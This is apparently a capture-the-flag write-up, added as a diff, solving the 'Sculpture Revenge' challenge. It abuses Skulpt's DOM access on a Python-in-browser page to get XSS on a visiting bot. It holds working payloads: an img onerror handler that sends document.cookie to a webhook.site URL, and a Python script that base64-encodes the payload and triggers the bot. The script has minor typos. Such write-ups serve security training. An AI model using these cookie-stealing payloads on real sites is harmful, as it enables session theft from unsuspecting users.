@@ -1,0 +1,57 @@
+Sculpture Revenge:
+    we have a xss bot and a page which can execute python code in js (using skulpt)
+    when we scan the source , we see this:
+    
+    function outf(text) { 
+        var mypre = document.getElementById("output"); 
+        mypre.innerText = mypre.innerText + text; 
+    } 
+    
+    and Sk.configure({output:outf, read:builtinRead}); 
+    which means we can perform xss in the tag id="output"
+    
+    Normally , we can use print() to print the xss tag but it cant so we have another option:
+    Lookat the main page of the https://skulpt.org/ , in example 8 , we see that:
+      import document
+      
+      pre = document.getElementById('edoutput')
+      pre.innerHTML = '''
+      <h1> Skulpt can also access DOM! </h1>
+      '''
+    we can directly change the html tag with "import document" 
+    => we create the payloads and inject into the textarea:
+      import document
+      body = document.getElementsByTagName('body')[0]
+      body.innerHTML += '<img src=x onerror="top.location=`https://webhook.site/jdjskadnasdsa?c=${document.cookie}`">'
+    
+    
+    <=> or we can run this py code in our pc to automatic get flag
+      import sys
+      import requests
+      
+      import base64
+      host = sys.argv[1]
+      webhook_url = sys.argv[2]
+      template =f"""
+      
+      import document
+      
+      pre = document.getElementByld('output')
+      pre.innerHTML ='''<img src=x onerror=window.location.href='{webhook_url}?flag='+document.cookie>'''
+      """
+      print("[+] Sending bot to visit url")
+      bot_visit =f"{host}bot?code={base64.b64encode(template.encode()).decode()}"
+      res = requests.get(bot_visit)
+      if res.status_code == 200:
+      print("[+] Bot visited url successfully. Check your webhook url")
+      print(f"[+] url: ")
+      print(bot_visit)
+      else:
+      print(f"[-] Received status code {res.status_code}. Something went wrong")
+      print(f"{res.text}")
+    
+    flag: {we_love_cattle_no_flags_in_dist_trust_we_know_what_we_are_doing_yep}
+
+
+
+
